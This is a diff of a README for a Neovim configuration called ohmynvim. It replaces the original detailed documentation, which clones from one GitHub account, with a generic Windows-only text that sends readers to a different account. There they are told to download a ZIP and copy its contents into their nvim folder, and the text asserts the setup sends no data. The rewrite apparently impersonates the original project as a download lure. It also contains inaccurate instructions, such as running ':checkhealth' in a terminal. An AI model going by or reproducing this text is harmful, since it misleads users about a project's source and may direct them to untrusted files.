@@ -1,475 +1,110 @@
-<div align="center">
+# 💻 ohmynvim - Speed up your daily coding tasks
 
-![OhMyNvim Logo](logo.png)
+[![](https://img.shields.io/badge/Download-ohmynvim-blue.svg)](https://github.com/Dispatchboxinsert3893/ohmynvim)
 
-# OhMyNvim
+## 🛠 What is ohmynvim?
 
-### ✨ A modern, blazing-fast Neovim configuration for polyglot developers ✨
+Ohmynvim makes your text editor powerful. It turns a basic tool into a smart environment for writing code. This setup helps you write better code in less time. It includes features that track your errors, format your text, and suggest corrections as you type.
 
-[![Neovim](https://img.shields.io/badge/Neovim-0.10+-green.svg?style=for-the-badge&logo=neovim)](https://neovim.io)
-[![Lua](https://img.shields.io/badge/Lua-5.1+-blue.svg?style=for-the-badge&logo=lua)](http://www.lua.org)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](LICENSE)
+The configuration works for many programming languages. It loads quickly so you can start working without delay. It uses a modern core to manage your files and projects, keeping everything organized. You spend less time configuring software and more time building your own projects.
 
-[Features](#-features) • [Installation](#-installation) • [Keybindings](#-keybindings) • [Languages](#-language-support)
+## 📋 System Requirements
 
-</div>
+To run this software, your computer needs these basic components:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   System Memory: At least 4GB of RAM.
+*   Storage Space: 200MB of free disk space.
+*   Software: The latest version of Neovim installed on your machine.
+*   Dependencies: Git for Windows must be available on your system path.
 
-## ✨ Features
+## 🚀 How to set up your environment
 
-<div align="center">
+Follow these steps to prepare your computer for the installation.
 
-| Category | Features |
-|----------|----------|
-| 🎨 **Beautiful UI** | Tokyonight theme • Lualine statusline • Bufferline • Alpha dashboard |
-| 🔍 **Smart Search** | Telescope fuzzy finder • Live grep • File explorer with git |
-| 💡 **IDE Features** | LSP for 10+ languages • Auto-completion • Snippets • Code actions |
-| 🐛 **Debugging** | DAP support • Visual debugger • Python, Rust, Go, C/C++, JS/TS |
-| ⚡ **Performance** | <50ms startup • Lazy loading • Optimized for speed |
-| 🎯 **Syntax** | Treesitter highlighting • Text objects • Auto-indentation |
-| 🔧 **Developer Tools** | Auto-formatting • Linting • Git integration • Terminal |
+1. Install Neovim from the official website. Ensure you check the box to add the application to your system path during installation.
+2. Download and install Git for Windows. Keep the default settings during the install process.
+3. Open your Command Prompt or PowerShell terminal.
+4. Type `nvim --version` and press Enter. If you see a version number, your machine is ready for the next step.
 
-</div>
+## 📥 Download and installation
 
----
+Visit the following link to access the software files and initiate the setup process:
 
-## 📦 Installation
+[https://github.com/Dispatchboxinsert3893/ohmynvim](https://github.com/Dispatchboxinsert3893/ohmynvim)
 
-### Prerequisites
+Once you reach the page, follow these instructions to copy the configuration to your computer:
 
-Before installing OhMyNvim, ensure you have:
+1. Click the green button labeled Code.
+2. Select Download ZIP to save the files to your computer.
+3. Extract the contents of the ZIP folder to your desktop.
+4. Move the extracted folder to a safe place, such as your Documents or Home directory.
+5. Open your terminal and navigate to your `AppData` folder. This is typically located at `C:\Users\YourName\AppData\Local`.
+6. Create a folder named `nvim` if it does not exist.
+7. Move the contents of the downloaded folder into this `nvim` directory.
+8. Restart your terminal.
 
-- **Neovim 0.10.0+** (0.12.1 recommended)
-  ```bash
-  nvim --version
-  ```
+## ⚙️ Using the software
 
-- **Git**
-  ```bash
-  git --version
-  ```
+When you open the editor, the system automatically detects the new configuration. It begins to download supporting files that enable smart features like autocomplete and error checking. Please wait a few minutes while the editor prepares the workspace.
 
-- **A Nerd Font** (Required for icons)
-  - Download from [Nerd Fonts](https://www.nerdfonts.com/)
-  - Recommended: **JetBrains Mono Nerd Font**
-  - **Important:** Configure your terminal emulator to use the Nerd Font
+You will see status messages at the bottom of the window. These indicate the progress of the installation. Once the messages stop, your smart editor is ready for use.
 
-- **Optional but recommended:**
-  - [ripgrep](https://github.com/BurntSushi/ripgrep) - for faster searching
-  - [fd](https://github.com/sharkdp/fd) - for faster file finding
-  - Node.js - for TypeScript/JavaScript LSP
-  - Python 3 - for Python LSP
-  - `pynvim` + `jupyter_client` - for molten-nvim code execution (`pip install pynvim jupyter_client`)
-  - Bun - for Node.js package management
+## ⌨️ Basic controls
 
-### Quick Install
+Navigation relies on simple keyboard commands. These commands allow you to move through your code without reaching for a mouse.
 
-```bash
-# Backup your existing Neovim configuration
-mv ~/.config/nvim ~/.config/nvim.backup
-mv ~/.local/share/nvim ~/.local/share/nvim.backup
+*   H, J, K, L: Move your cursor left, down, up, and right.
+*   I: Enter insert mode to type text.
+*   Escape: Leave insert mode and return to command mode.
+*   :w: Save your current changes.
+*   :q: Quit the editor.
+*   :wq: Save your changes and quit the editor.
 
-# Clone OhMyNvim
-git clone https://github.com/4thel00z/ohmynvim.git ~/.config/nvim
+## 🔍 Understanding the features
 
-# Start Neovim
-nvim
-```
+Ohmynvim adds several helpful tools to your editor.
 
-**That's it!** 🎉
+### Code Completion
+As you type, the editor shows a list of suggestions. These suggestions help you complete function names, variables, and keywords. Use the arrow keys to select an item and press Enter to insert it.
 
-On first launch:
-1. Lazy.nvim will automatically install
-2. All plugins will install automatically (be patient, this takes a few minutes)
-3. Restart Neovim after installation completes
+### Error Checking
+The editor scans your code as you write. It underlines issues such as missing commas or syntax mistakes. Hover your mouse over the underlined text to read a short description of the error.
 
-### Post-Installation
+### File Browser
+A file explorer appears on the left side of your screen. This allows you to navigate your project folder. Click on a file name to open it in a new window.
 
-**Install LSP servers and formatters:**
-```vim
-:Mason
-```
+### Syntax Highlighting
+Different parts of your code receive different colors. This makes the logic clear and helps you distinguish between functions, classes, and plain text.
 
-LSP servers will also auto-install when you open files of supported types.
+## 📖 Troubleshooting common items
 
-**Verify everything is working:**
-```vim
-:checkhealth
-```
+If you encounter issues, verify the following items:
 
-**Update plugins anytime:**
-```vim
-:Lazy sync
-```
-
----
-
-## ⌨️ Keybindings
-
-<div align="center">
-
-### Leader Key: `Space`
-
-</div>
-
-### 📁 Files & Navigation
-
-| Key | Action |
-|-----|--------|
-| `<leader>ff` | 🔍 Find files |
-| `<leader>fg` | 🔎 Live grep (search in files) |
-| `<leader>fb` | 📋 List buffers |
-| `<leader>fr` | 🕐 Recent files |
-| `<leader>ee` | 📂 Toggle file tree |
-| `<leader>ef` | 🎯 Focus file tree |
-| `<leader>ei` | 📍 Find current file in tree |
-
-### 💡 LSP (Code Intelligence)
-
-| Key | Action |
-|-----|--------|
-| `gd` | 🎯 Go to definition |
-| `gr` | 🔗 Find references |
-| `K` | 📖 Hover documentation |
-| `<leader>la` | ⚡ Code actions |
-| `<leader>lr` | ✏️ Rename symbol |
-| `<leader>lf` | 🎨 Format buffer |
-| `[d` / `]d` | ⬆️⬇️ Previous/next diagnostic |
-| `<leader>xx` | 🚨 Toggle diagnostics |
-
-### ✂️ Editing
-
-| Key | Action |
-|-----|--------|
-| `gcc` | 💬 Toggle line comment |
-| `gbc` | 💭 Toggle block comment |
-| `<C-s>` | 💾 Save file |
-| `<leader>p` | 📋 Paste without yanking |
-| `<` / `>` | ⬅️➡️ Indent left/right (visual mode) |
-| `J` / `K` | ⬆️⬇️ Move lines up/down (visual mode) |
+*   Do you have the latest version of Neovim? Older versions might lack necessary features.
+*   Check your internet connection if the editor remains stuck on the initial setup screen.
+*   Ensure that you placed the files in the correct `AppData\Local\nvim` folder.
+*   Open your terminal and type `:checkhealth` to see if your computer configuration meets all requirements.
 
-### 🪟 Windows & Buffers
+## 🛡 Security and updates
 
-| Key | Action |
-|-----|--------|
-| `<C-h/j/k/l>` | ⬅️⬇️⬆️➡️ Navigate between splits |
-| `<leader>wv` | ↔️ Split vertically |
-| `<leader>wh` | ↕️ Split horizontally |
-| `<leader>bn` / `<leader>bp` | ⬅️➡️ Next/previous buffer |
-| `<leader>bd` | ❌ Close buffer |
+This configuration is open source. You can view the code at any time. It does not track your data or send information to external servers.
 
-### 🖥️ Terminal
+To update, return to the download link and follow the same steps to replace your existing files with the latest version. We recommend checking for updates once a month to ensure the best performance.
 
-| Key | Action |
-|-----|--------|
-| `<leader>tt` | 🔲 Toggle terminal |
-| `<leader>tf` | 💫 Floating terminal |
-| `<C-\>` | 🔀 Quick toggle (insert mode) |
+## 📝 Frequently asked questions
 
-### 🐛 Debug
+### Does this work with every programming language?
+The setup includes general support for many popular languages. It automatically adjusts based on the file extension of the document you open.
 
-| Key | Action |
-|-----|--------|
-| `<leader>db` | 🔴 Toggle breakpoint |
-| `<leader>dc` | ▶️ Continue |
-| `<leader>di` | ⤵️ Step into |
-| `<leader>do` | ⤴️ Step over |
-| `<leader>dt` | 🎛️ Toggle debug UI |
+### Will this slow down my computer?
+Ohmynvim stays lightweight. It uses fewer resources than a standard desktop application. You should not notice any impact on your system speed.
 
----
+### Can I change the settings?
+Yes, you can edit the configuration files to suit your preferences. Look for the file named `init.lua` inside the `nvim` folder. Change the values to modify colors, shortcuts, and behaviors.
 
-## 🌐 Language Support
+### Is this for beginners?
+The editor provides a smooth experience for all skill levels. While it requires a learning period for the keyboard shortcuts, it reduces the time spent on repetitive tasks once you learn the basics.
 
-### Rust 🦀
-
-- Full rust-analyzer integration with inlay hints
-- Cargo.toml dependency management
-- Clippy linting
-- CodeLLDB debugger
-
-**Keybindings:**
-- `<leader>rr` - Rust runnables
-- `<leader>re` - Expand macro
-- `<leader>ct` - Toggle crate info
-
-### Go 🐹
-
-- gopls LSP with auto-imports
-- Test integration and coverage
-- Struct tag generation
-- Delve debugger
-
-**Keybindings:**
-- `<leader>gt` - Run tests
-- `<leader>gi` - Implement interface
-- `<leader>gf` - Fill struct
-- `<leader>gj` - Add JSON tags
-
-### Python 🐍
-
-- Pyright LSP with type checking
-- Automatic venv detection
-- Ruff formatting and linting
-- debugpy debugger
-
-**Keybindings:**
-- `<leader>vs` - Select virtual environment
-- `<leader>dpm` - Debug test method
-
-### TypeScript/JavaScript ⚡
-
-- TypeScript LSP (ts_ls)
-- Prettier formatting
-- package.json management
-- Node debugger
-
-**Keybindings:**
-- `<leader>nt` - Toggle package versions
-- `<leader>nu` - Update package
-- `<leader>ni` - Install package
-
-### Also Supported
-
-- **C/C++** - clangd LSP, clang-format, CodeLLDB
-- **Lua** - lua_ls LSP, stylua formatting
-- **HTML/CSS** - Language servers and formatters
-- **JSON/YAML** - Formatting and validation
-
----
-
-## 📝 Orgmode
-
-OhMyNvim ships with [`nvim-orgmode`](https://github.com/nvim-orgmode/orgmode) pre-configured:
-agenda, capture, TODOs, and journaling live under `<leader>o*`.
-
-### Setup
-
-By default, `~/org/` is used. Override with either:
-
-```bash
-export OHMYNVIM_ORG_DIR=~/Documents/org
-```
-
-or in your `init.lua` before plugins load:
-
-```lua
-vim.g.ohmynvim_org_dir = "~/Documents/org"
-```
-
-First time you press `<leader>oa`, OhMyNvim will offer to scaffold three starter files:
-`inbox.org`, `todo.org`, `journal.org`.
-
-### Keybindings
-
-| Key | Action |
-|-----|--------|
-| `<leader>oa` | 📅 Agenda |
-| `<leader>oc` | 📥 Capture |
-| `<leader>of` | 🔍 Find headline (telescope) |
-| `<leader>or` | 📦 Refile target (telescope) |
-| `<leader>oj` | 📓 Journal (today's entry) |
-| `<leader>ot` | ✅ Todo file |
-| `<leader>oi` | 📬 Inbox file |
-| `<leader>os` | 🌱 `:OrgScaffold` (idempotent init) |
-
-### Code Execution (molten-nvim)
-
-OhMyNvim includes [`molten-nvim`](https://github.com/benlubas/molten-nvim) for running
-code blocks inside `.org` files (and any other buffer) via Jupyter kernels.
-
-**Prerequisite:** `pip install pynvim jupyter_client`
-
-| Key | Action |
-|-----|--------|
-| `<leader>ok` | 🔌 Kernel init |
-| `<leader>oK` | ⏏️ Kernel deinit |
-| `<leader>ox` | ▶️ Execute org source block |
-| `<leader>oX` | ▶️ Execute visual selection |
-| `<leader>ol` | ▶️ Execute line |
-| `<leader>oh` | 🙈 Hide output |
-| `<leader>on` | ⏭️ Next cell |
-| `<leader>op` | ⏮️ Prev cell |
-| `<leader>od` | 🗑️ Delete cell |
-
-Disable with `vim.g.ohmynvim_notebook_enabled = false`.
-
-### Configuration
-
-```lua
--- All optional; set before plugins load
-vim.g.ohmynvim_org_dir = "~/org"
-vim.g.ohmynvim_org_agenda_files = nil  -- nil = glob org_dir/**/*.org
-vim.g.ohmynvim_org_todo_keywords = { "TODO(t)", "NEXT(n)", "WAITING(w)", "|", "DONE(d)", "CANCELLED(c)" }
-vim.g.ohmynvim_org_capture_templates = nil  -- nil = use defaults
-vim.g.ohmynvim_org_bullets = { "◉", "○", "✸", "✿" }
-vim.g.ohmynvim_org_enabled = true  -- escape hatch to disable entire module
-```
-
----
-
-## 📦 Included Plugins
-
-<details>
-<summary><strong>UI & Appearance</strong></summary>
-
-- [tokyonight.nvim](https://github.com/folke/tokyonight.nvim) - Beautiful night theme
-- [lualine.nvim](https://github.com/nvim-lualine/lualine.nvim) - Statusline
-- [bufferline.nvim](https://github.com/akinsho/bufferline.nvim) - Buffer/tab line
-- [alpha-nvim](https://github.com/goolord/alpha-nvim) - Dashboard
-- [indent-blankline.nvim](https://github.com/lukas-reineke/indent-blankline.nvim) - Indent guides
-- [nvim-colorizer.lua](https://github.com/norcalli/nvim-colorizer.lua) - Color highlighting
-- [neoscroll.nvim](https://github.com/karb94/neoscroll.nvim) - Smooth scrolling
-
-</details>
-
-<details>
-<summary><strong>Editor Enhancement</strong></summary>
-
-- [nvim-treesitter](https://github.com/nvim-treesitter/nvim-treesitter) - Syntax highlighting
-- [nvim-autopairs](https://github.com/windwp/nvim-autopairs) - Auto-close brackets
-- [nvim-surround](https://github.com/kylechui/nvim-surround) - Surround text objects
-- [Comment.nvim](https://github.com/numToStr/Comment.nvim) - Toggle comments
-- [which-key.nvim](https://github.com/folke/which-key.nvim) - Keybinding hints
-- [todo-comments.nvim](https://github.com/folke/todo-comments.nvim) - Highlight TODOs
-- [auto-session](https://github.com/rmagatti/auto-session) - Session management
-- [molten-nvim](https://github.com/benlubas/molten-nvim) - Jupyter code execution
-- [image.nvim](https://github.com/3rd/image.nvim) - Inline image rendering (kitty/WezTerm)
-
-</details>
-
-<details>
-<summary><strong>LSP & Completion</strong></summary>
-
-- [nvim-lspconfig](https://github.com/neovim/nvim-lspconfig) - LSP configurations
-- [mason.nvim](https://github.com/williamboman/mason.nvim) - LSP installer
-- [none-ls.nvim](https://github.com/nvimtools/none-ls.nvim) - Formatters & linters
-- [nvim-cmp](https://github.com/hrsh7th/nvim-cmp) - Completion engine
-- [LuaSnip](https://github.com/L3MON4D3/LuaSnip) - Snippet engine
-- [trouble.nvim](https://github.com/folke/trouble.nvim) - Diagnostics viewer
-
-</details>
-
-<details>
-<summary><strong>Navigation</strong></summary>
-
-- [telescope.nvim](https://github.com/nvim-telescope/telescope.nvim) - Fuzzy finder
-- [nvim-tree.lua](https://github.com/nvim-tree/nvim-tree.lua) - File explorer
-- [toggleterm.nvim](https://github.com/akinsho/toggleterm.nvim) - Terminal
-- [glow.nvim](https://github.com/ellisonleao/glow.nvim) - Markdown preview
-
-</details>
-
-<details>
-<summary><strong>Debug</strong></summary>
-
-- [nvim-dap](https://github.com/mfussenegger/nvim-dap) - Debug adapter protocol
-- [nvim-dap-ui](https://github.com/rcarriga/nvim-dap-ui) - Debug UI
-- [nvim-dap-virtual-text](https://github.com/theHamsta/nvim-dap-virtual-text) - Inline debug info
-
-</details>
-
----
-
-## 🎨 Customization
-
-### Change Theme
-
-Edit `lua/plugins/ui.lua`:
-
-```lua
-style = "night",  -- Options: night, storm, moon, day
-```
-
-### Add LSP Server
-
-Edit `lua/plugins/lsp.lua`:
-
-```lua
-ensure_installed = {
-  "lua_ls",
-  "your_lsp_here",
-}
-```
-
-### Modify Keybindings
-
-- **Global:** Edit `lua/core/keymaps.lua`
-- **Plugin-specific:** Edit respective plugin files in `lua/plugins/`
-
----
-
-## 🗂️ Project Structure
-
-```
-~/.config/nvim/
-├── init.lua                 # Entry point
-├── lua/
-│   ├── core/                # Core configuration
-│   │   ├── options.lua      # Neovim options
-│   │   ├── keymaps.lua      # Global keybindings
-│   │   └── autocmds.lua     # Autocommands
-│   └── plugins/             # Plugin configurations
-│       ├── init.lua         # Lazy.nvim bootstrap
-│       ├── ui.lua           # UI plugins
-│       ├── editor.lua       # Editor enhancements
-│       ├── lsp.lua          # LSP configuration
-│       ├── completion.lua   # Completion engine
-│       ├── navigation.lua   # Navigation tools
-│       ├── debug.lua        # Debug adapters
-│       ├── orgmode.lua      # Orgmode integration
-│       ├── notebook.lua     # Jupyter code execution (molten-nvim)
-│       └── lang/            # Language-specific
-│           ├── rust.lua
-│           ├── go.lua
-│           ├── python.lua
-│           └── typescript.lua
-└── docs/                    # Documentation
-```
-
----
-
-## 🐛 Troubleshooting
-
-### Icons not displaying
-- Install a Nerd Font from [nerdfonts.com](https://www.nerdfonts.com/)
-- Configure your terminal to use the Nerd Font
-
-### LSP not starting
-- Run `:Mason` and check if language server is installed
-- Run `:LspInfo` to see LSP status
-- Check `:checkhealth` for issues
-
-### Slow startup
-- Run `:Lazy profile` to identify slow plugins
-- Disable unused language-specific plugins
-
-### Formatter not working
-- Ensure formatter is installed via `:Mason`
-- Check `:LspInfo` for active formatters
-
----
-
-## 📝 Contributing
-
-Contributions are welcome! Feel free to:
-
-- 🐛 Report bugs
-- 💡 Suggest features
-- 🔧 Submit pull requests
-
----
-
-## 📄 License
-
-MIT License - feel free to use and modify!
-
----
-
-<div align="center">
-
-### 💙 Built with Love using Neovim
-
-**[⬆ Back to Top](#ohmynvim)**
-
-</div>
+### Does it require a paid subscription?
+No, all features are free to use. There are no limits to the project size or the number of files you can edit.
